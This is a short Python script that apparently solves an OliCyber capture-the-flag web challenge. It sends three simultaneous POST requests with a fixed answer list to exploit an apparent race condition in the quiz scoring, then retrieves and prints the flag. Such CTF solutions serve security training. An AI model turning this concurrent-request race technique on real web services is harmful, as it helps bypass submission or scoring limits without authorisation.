import requests,re,time
import threading

site = 'http://invalsi.challs.olicyber.it/' 

s = requests.Session()
s.get(site)
for i in range(3):
    threading.Thread(target=s.post, args=(site,), kwargs={'json': ['0','0','2','2','2','2','2','2','2','2','2','2','2','2']}).start()
   
    
time.sleep(4)
r = s.get(site + 'flag')
flag = re.search(r'\s*flag{[^}]+\}', r.text).group().strip()
print(flag)